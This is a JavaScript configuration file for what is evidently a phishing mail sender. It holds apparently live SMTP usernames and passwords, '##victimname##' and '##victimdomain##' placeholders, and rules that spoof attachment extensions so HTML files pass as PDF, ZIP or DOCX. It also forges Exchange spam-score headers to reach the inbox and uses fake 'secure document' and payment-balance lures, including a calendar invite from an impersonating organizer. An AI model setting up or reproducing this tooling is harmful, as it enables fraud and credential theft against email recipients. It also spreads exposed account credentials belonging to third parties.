module.exports = {
    // Single SMTP configuration (for backward compatibility)
    smtp: {
        host: "smtp.PUT-hosthere.com", // USE THIS FOR SINGLE SMTP
        port: 587,
        secure: false,
        auth: {
            user: "USERNAME",
            pass: "PASSWORD"
        },
        fromEmail: "SMTP FROMMAIL OR USERNAME",
        fromName: "Core Sender Secure Delivery"
    },

    // Multiple SMTP configurations
    smtps: [
        {
            name: "SMTP1",
            host: "mail.smtp2go.com",
            port: 587,
            secure: false,
            auth: {
                user: "noreply@craigboggs.com",
                pass: "GV437zHEUbEkX4ab"
            },
            fromEmail: "noreply@craigboggs.com",
            fromName: "##randomcompany##",
            emailCount: 1,
            currentCount: 0
        },
        {
            name: "SMTP2", 
            host: "mail.smtp2go.com",
            port: 587,
            secure: false,
            auth: {
                user: "info@equi-toxpharma.com",
                pass: "72ZZniw1a5dzUDMF"
            },
            fromEmail: "info@equi-toxpharma.com",
            fromName: "##randomcompany##",
            emailCount: 1,
            currentCount: 0
        },
        {
            name: "SMTP3",
            host: "smtp.mailgun.org",
            port: 587,
            secure: false,
            auth: {
                user: "noreply@worldwidesigns.com",
                pass: "6458018cb8ecb05ee2ac9a8828100a4e-5e1ffd43-f61fc892"
            },
            fromEmail: "noreply@worldwidesigns.com",
            fromName: "##randomcompany##",
            emailCount: 2,
            currentCount: 0
        }
    ],

    // SMTP Management Settings - OPTIMIZED FOR DELIVERABILITY
    smtpManagement: {
        enabled: false,
        strategy: "round-robin",
        maxConcurrentSmtp: 2, // Reduced for better reputation
        delayBetweenSmtpSwitch: 2000,
        failoverEnabled: true,
        monitorSmtpHealth: true
    },

    // Per-Field Rotation System - OPTIMIZED FOR NATURAL APPEARANCE
    rotation: {
        enabled: false,
        fromEmail: {
            enabled: false,
            perCount: 3,
            values: [
                "noreply@company1.com",
                "support@company2.com",
                "info@company3.com"
            ]
        },
        fromName: {
            enabled: false, // Enabled for better variety
            perCount: 2,
            values: [
                "##randomcompany## Team",
                "##randomcompany## Support",
                "Customer Success - ##randomcompany##",
                "##randomcompany## Communications"
            ]
        },
        subject: {
            enabled: true,
            perCount: 1,
            values: [
                "Following up on our conversation",
                "Quick question about your availability",
                "Checking in regarding your thoughts",
                "Update on the matter we discussed",
                "Circling back on our conversation",
                "Touching base as promised",
                "Following up from our last discussion"
            ]
        },
        links: {
            enabled: false,
            perCount: 3,
            values: [
                "https://your-link1.com",
                "https://your-link2.com",
                "https://your-link3.com"
            ],
            placeholder: "##link##"
        }
    },

    // PDF Modification Engine
    pdfModification: {
        enabled: false,
        addPassword: {
            enabled: false,
            password: "##EMAIL##"
        },
        addLogo: {
            enabled: false,
            path: "./logo.png",
            x: 50,
            y: 740,
            width: 100,
            height: 30,
            opacity: 1
        },
        addQR: {
            enabled: false,
            content: "##link##",
            x: 250,
            y: 538,
            width: 120,
            height: 120,
            opacity: 1
        }
    },

    // Advanced QR Code Customization
    qrCodeAdvanced: {
        enabled: false,
        size: 300,
        margin: 1,
        errorCorrection: 'M',
        foreground: '#000000',
        background: '#FFFFFF',
        embedLogo: {
            enabled: false,
            path: "./qr_logo.png",
            size: 0.4
        },
        types: {
            emailBody: {
                enabled: false,
                size: 250,
                foreground: '#2C5AA0',
                background: '#FFFFFF'
            },
            pdfEmbedded: {
                enabled: false,
                size: 120,
                foreground: '#000000',
                background: '#FFFFFF'
            },
            attachment: {
                enabled: false,
                size: 300,
                foreground: '#1A365D',
                background: '#F7FAFC'
            }
        }
    },

    // Document Conversion Engine
    documentConversion: {
        enabled: false,
        formats: {
            docx: {
                enabled: false,
                template: "attach1.html",
                filename: "Document_##victimname##.docx"
            },
            rtf: {
                enabled: false,
                template: "attach1.html", 
                filename: "Document_##victimname##.rtf"
            },
            odt: {
                enabled: false,
                template: "attach1.html",
                filename: "Document_##victimname##.odt"
            }
        }
    },

    // Attachment Spoofing System
    attachmentSpoofing: {
        enabled: false,
        spoofExtensions: {
            enabled: false,
            mappings: [
                { original: "html", spoofed: "zip" },
                { original: "html", spoofed: "pdf" },
                { original: "html", spoofed: "mp4" },
                { original: "html", spoofed: "docx" }
            ]
        },
        filenameObfuscation: {
            enabled: false,
            patterns: [
                "Birthday_Photos_##randomnumber##",
                "Financial_Report_##company##",
                "Meeting_Notes_##date##"
            ]
        }
    },

    // Embedded Image System
    embeddedImages: {
        enabled: false,
        images: [
            {
                enabled: false,
                path: "./embedded_logo.png",
                cid: "company_logo",
                placeholder: "##LOGO_IMAGE##"
            },
            {
                enabled: false, 
                path: "./signature.png",
                cid: "signature",
                placeholder: "##SIGNATURE_IMAGE##"
            },
            {
                enabled: false,
                path: "./banner.jpg", 
                cid: "banner",
                placeholder: "##BANNER_IMAGE##"
            }
        ]
    },

    // ✅ **FIXED: PROFESSIONAL HEADERS FOR 100% INBOX**
    customHeaders: {
        "Reply-To": "##fromEmail##", // Dynamic based on sender
		"Accept-Language": "en-US",
		"Content-Language": "en-US",
		"X-MS-Has-Attach": "yes",
		"X-MS-TNEF-Correlator": "",
        "msip_labels": "",
        "X-MS-Exchange-Organization-SCL": "1"
    },
    enableCustomHeaders: true,
    
    // ✅ **FIXED: NATURAL SUBJECT LINE**
    subject: "A Secure PDF Document Has Been Shared With You",

    features: {
        sendHtmlEmail: {
            enabled: true,
            template: "letter.html",
        },
        sendPdfAttachment: {
            enabled: false,
            template: "attach1.html",
            filename: "Confidential_Legal_Document.pdf", // More natural filename
        },
        sendRawPdfAttachment: {
            enabled: false,
            path: "./document.pdf",
            filename: "Confidential_Legal_Document.pdf"
        },
        sendEmlAttachment: {
            enabled: true,
            template: "0uimoney.eml",
            filename: "Accounting Department document(s) - Schedule balance:##num7####num4##.eml",
        },
        
        // ENHANCED: ICS with Fully Customizable Content and Duration
        sendIcsAttachment: {
            enabled: false,
            filename: "##victimdomain1##'s, inc. Document Review.ics",
            method: "REQUEST",
            
            // Enhanced CTA Configuration
            cta: {
                enabled: true,
                buttonText: "Open Secure Portal",
                destinationUrl: "https://l.tr.com/",
                invitationText: "Schedule Balance"
            },

            event: {
                start: "Thur 12/11/2025",
                duration: 60, // SET YOUR DURATION IN MINUTES: 30, 45, 60, 90, 120, etc.
                summary: "Payment for ##victimdomain1##",
                description: `Schedule Balance;
 Please Review Increase.

DETAILS:Balance Payment for ##victimdomain1##
• Date: ##date##
• Time: ##time##



Best regards,
FMC GLOBAL GROUP Team`,
                location: "PDF Portal",
                url: "https://dialin.teams.microsoft.com/usp/pstnconferencing",
                organizer: {
                    name: "FMC GLOBAL GROUP",
                    email: "support@adobegroups.com"
                },
                attendees: []
            },

            // FULLY CUSTOMIZABLE HTML TEMPLATE
            htmlTemplate: {
                title: "Balance Schedule Payment for ##victimdomain1##", // Custom title
                headerColor: "#ff0000", // Red headers
                backgroundColor: "#e8f4fd", // Light blue background
                textColor: "#333", // Dark text
                buttonColor: "#28a745", // Green button
                footerColor: "#666", // Gray footer
                showDuration: false, // Show duration
                showLocation: true, // Show location
                customFooter: "Pending Remittance" // Custom footer
            }
        },
        
        sendZipAttachment: {
            enabled: false,
            filename: "Attached_Files.zip",
            files: [
                { path: "./file1.txt", name: "file1.txt" },
                { path: "./file2.pdf", name: "document.pdf" }
            ]
        },
        htmlToImage: {
            enabled: false,
            format: 'jpeg',
            quality: 80,
            fullPage: true,
            omitBackground: false,
            imageName: "email_body.jpeg"
        },
        htmlAttachments: [
            {
                enabled: false,
                path: "./attach_html_template.html",
                filename: "Dynamic_Document.html"
            }
        ],
    },
    cidMappings: require('./cids.json'),
    recipientsFilePath: "list.txt",
    testAfterSends: 500,
    
    // ✅ **INCREASED DELAY FOR BETTER REPUTATION**
    delayBetweenEmails: 1500,

    // PDF Options
    pdfOptions: {
        format: "A4",
        orientation: "portrait",
        border: {
            top: "0.5in",
            right: "0.5in",
            bottom: "0.5in",
            left: "0.5in"
        }
    }
};